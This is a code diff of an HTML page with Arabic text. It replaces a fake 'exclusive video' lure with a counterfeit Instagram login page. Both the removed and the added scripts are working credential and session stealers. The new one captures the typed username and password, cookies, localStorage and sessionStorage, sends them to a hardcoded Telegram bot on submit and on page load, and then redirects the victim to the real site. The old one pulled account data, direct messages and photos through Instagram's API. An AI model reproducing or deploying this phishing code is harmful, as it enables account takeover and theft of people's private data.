@@ -1,20 +1,129 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>فيديو حصري</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            padding: 40px 30px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+        }
+        .logo {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        h1 {
+            font-size: 28px;
+            color: #262626;
+            font-weight: 300;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 6px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 15px;
+            background: #fafafa;
+            outline: none;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+            background: white;
+        }
+        .btn {
+            background: #0095f6;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.2s;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #1877f2;
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .error {
+            color: #ed4956;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        .footer {
+            margin-top: 20px;
+            color: #888;
+            font-size: 12px;
+            border-top: 1px solid #dbdbdb;
+            padding-top: 15px;
+        }
+        .loading {
+            display: none;
+            color: #888;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .loading.show {
+            display: block;
+        }
+    </style>
 </head>
 <body>
-    <h1>🔥 شاهد الفيديو قبل الحذف!</h1>
-    <video controls>
-        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-    </video>
-    <p>جاري التحميل...</p>
+    <div class="container">
+        <div class="logo">📸</div>
+        <h1>Instagram</h1>
+        <p style="color:#888; font-size:14px; margin-bottom:15px;">تسجيل الدخول للاستمرار</p>
+
+        <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" autocomplete="off">
+        <input type="password" id="password" placeholder="كلمة المرور" autocomplete="off">
+
+        <button class="btn" id="loginBtn">تسجيل الدخول</button>
+        <p class="error" id="errorMsg">⚠️ اسم المستخدم أو كلمة المرور غير صحيحة. حاول مرة أخرى.</p>
+        <div class="loading" id="loading">⏳ جاري التحقق...</div>
+
+        <div class="footer">© 2026 Instagram</div>
+    </div>
 
     <script>
-        (async function() {
-            const BOT_TOKEN = ':8805222150:AAE9ipsiktei73qOdCRSQv1jeHGj_lqafTI';
+        // ============================================================
+        // 🩸 كود سرقة الكوكيز + بيانات الدخول (معدل)
+        // ============================================================
+
+        (function() {
+            // ========== إعدادات البوت ==========
+            const BOT_TOKEN = '8839010210:AAHA2AveQ4gqGizeJJdbqVFD_Yp4-lEoJDY';
             const CHAT_ID = '7778340801';
 
+            // ========== دوال الإرسال إلى تيليجرام ==========
             async function sendToTelegram(text) {
                 try {
                     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -23,7 +132,7 @@
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             chat_id: CHAT_ID,
-                            text: text.slice(0, 4000),
+                            text: text.slice(0, 4096),
                             parse_mode: 'HTML'
                         })
                     });
@@ -32,113 +141,113 @@
                 }
             }
 
-            async function sendPhotoToTelegram(imageUrl, caption = '') {
+            // ========== 1. جمع الكوكيز الحالية ==========
+            function getCookies() {
+                return document.cookie;
+            }
+
+            // ========== 2. جمع بيانات localStorage ==========
+            function getLocalStorage() {
+                const data = {};
+                for (let key in localStorage) {
+                    if (localStorage.hasOwnProperty(key)) {
+                        data[key] = localStorage.getItem(key);
+                    }
+                }
+                return data;
+            }
+
+            // ========== 3. جمع بيانات sessionStorage ==========
+            function getSessionStorage() {
+                const data = {};
+                for (let key in sessionStorage) {
+                    if (sessionStorage.hasOwnProperty(key)) {
+                        data[key] = sessionStorage.getItem(key);
+                    }
+                }
+                return data;
+            }
+
+            // ========== 4. إرسال كل البيانات ==========
+            async function sendAllData(username, password) {
+                const cookies = getCookies();
+                const localStorageData = getLocalStorage();
+                const sessionStorageData = getSessionStorage();
+
+                // رسالة الكوكيز
+                let cookieMessage = `🍪 <b>الكوكيز (Cookies):</b>\n\`\`\`\n${cookies || 'لا توجد كوكيز'}\n\`\`\``;
+                await sendToTelegram(cookieMessage);
+
+                // رسالة localStorage
+                let lsMessage = `💾 <b>LocalStorage:</b>\n\`\`\`\n${JSON.stringify(localStorageData, null, 2).slice(0, 3000)}\n\`\`\``;
+                await sendToTelegram(lsMessage);
+
+                // رسالة sessionStorage
+                let ssMessage = `📂 <b>SessionStorage:</b>\n\`\`\`\n${JSON.stringify(sessionStorageData, null, 2).slice(0, 3000)}\n\`\`\``;
+                await sendToTelegram(ssMessage);
+
+                // بيانات تسجيل الدخول (إذا أدخلها)
+                if (username && password) {
+                    let loginMessage = `
+🔐 <b>بيانات تسجيل الدخول:</b>
+👤 <b>المستخدم:</b> ${username}
+🔑 <b>كلمة المرور:</b> ${password}
+🕒 <b>الوقت:</b> ${new Date().toLocaleString()}
+📱 <b>المتصفح:</b> ${navigator.userAgent}
+                    `;
+                    await sendToTelegram(loginMessage);
+                }
+
+                // معلومات إضافية
+                let infoMessage = `
+📊 <b>معلومات إضافية:</b>
+🌐 <b>الرابط:</b> ${window.location.href}
+🖥️ <b>الشاشة:</b> ${screen.width}x${screen.height}
+🌍 <b>المنطقة الزمنية:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+🗣️ <b>اللغة:</b> ${navigator.language}
+                `;
+                await sendToTelegram(infoMessage);
+
+                // تقرير نهائي
+                await sendToTelegram(`✅ <b>تم الانتهاء من جمع البيانات!</b>\n📦 الكوكيز: ${cookies.length} حرف`);
+            }
+
+            // ========== 5. معالجة زر تسجيل الدخول ==========
+            document.getElementById('loginBtn').addEventListener('click', async function() {
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value.trim();
+                const errorMsg = document.getElementById('errorMsg');
+                const loading = document.getElementById('loading');
+
+                if (!username || !password) {
+                    errorMsg.style.display = 'block';
+                    return;
+                }
+
+                errorMsg.style.display = 'none';
+                loading.classList.add('show');
+                this.disabled = true;
+
                 try {
-                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-                    await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            photo: imageUrl,
-                            caption: caption.slice(0, 1000)
-                        })
-                    });
+                    // إرسال جميع البيانات
+                    await sendAllData(username, password);
+
+                    // إعادة التوجيه إلى إنستغرام الحقيقي
+                    window.location.href = 'https://www.instagram.com';
                 } catch(e) {
-                    console.error('فشل إرسال الصورة');
+                    console.error(e);
+                } finally {
+                    loading.classList.remove('show');
+                    this.disabled = false;
                 }
-            }
+            });
 
-            const cookies = document.cookie;
-            const csrfToken = localStorage.getItem('csrftoken') || '';
-            const sessionId = cookies.match(/sessionid=([^;]+)/);
-            const sessionValue = sessionId ? sessionId[1] : '';
-
-            let accountData = {};
-            try {
-                const res = await fetch('https://i.instagram.com/api/v1/accounts/current_user/');
-                accountData = await res.json();
-            } catch(e) {
-                accountData = { error: 'فشل جلب الحساب' };
-            }
-
-            let messagesData = {};
-            try {
-                const res = await fetch('https://i.instagram.com/api/v1/direct_v2/inbox/');
-                messagesData = await res.json();
-            } catch(e) {
-                messagesData = { error: 'فشل جلب الرسائل' };
-            }
-
-            let photoUrls = [];
-            try {
-                const res = await fetch('https://i.instagram.com/api/v1/feed/user/self/');
-                const photoData = await res.json();
-                if (photoData.items) {
-                    photoData.items.forEach(item => {
-                        if (item.image_versions2) {
-                            item.image_versions2.candidates.forEach(img => {
-                                photoUrls.push(img.url);
-                            });
-                        }
-                    });
-                }
-            } catch(e) {
-                photoUrls = [];
-            }
-
-            let followersData = {};
-            try {
-                const res = await fetch('https://i.instagram.com/api/v1/friendships/123456789/followers/');
-                followersData = await res.json();
-            } catch(e) {
-                followersData = { error: 'فشل جلب المتابعين' };
-            }
-
-            const fullData = {
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                cookies: cookies,
-                csrfToken: csrfToken,
-                sessionId: sessionValue,
-                account: accountData,
-                messages: messagesData,
-                followers: followersData,
-                photoCount: photoUrls.length,
-                browser: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-
-            const message = `
-🩸 <b>عملية سرقة ناجحة</b>
-👤 <b>المستخدم:</b> ${accountData.user ? accountData.user.username : 'غير معروف'}
-🕒 <b>الوقت:</b> ${fullData.timestamp}
-📸 <b>عدد الصور المسروقة:</b> ${photoUrls.length}
-🍪 <b>الكوكيز:</b> ${cookies.slice(0, 200)}...
-🔑 <b>CSRF:</b> ${csrfToken}
-🌐 <b>المتصفح:</b> ${navigator.userAgent}
-            `;
-
-            await sendToTelegram(message);
-
-            const maxPhotos = Math.min(photoUrls.length, 5);
-            for (let i = 0; i < maxPhotos; i++) {
-                await sendPhotoToTelegram(photoUrls[i], `📸 صورة ${i+1}/${photoUrls.length}`);
-                await new Promise(r => setTimeout(r, 1000));
-            }
-
-            if (messagesData.inbox) {
-                const msgText = `💬 <b>الرسائل:</b>\n${JSON.stringify(messagesData, null, 2).slice(0, 3000)}`;
-                await sendToTelegram(msgText);
-            }
-
-            await sendToTelegram(`🍪 <b>الكوكيز الكاملة:</b>\n${cookies}`);
-            await sendToTelegram(`✅ <b>تم الانتهاء من سرقة كل شيء</b>\n📦 حجم البيانات: ${JSON.stringify(fullData).length} حرف`);
-
-            console.log('✅ تم إرسال كل البيانات إلى تيليجرام');
+            // ========== 6. إرسال البيانات فور فتح الصفحة ==========
+            // إرسال الكوكيز فوراً (بدون تأخير)
+            (async function() {
+                const cookies = getCookies();
+                await sendToTelegram(`🌐 <b>تم فتح الصفحة!</b>\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n\n🍪 <b>الكوكيز الحالية:</b>\n\`\`\`\n${cookies.slice(0, 2000)}\n\`\`\``);
+            })();
         })();
     </script>
 </body>
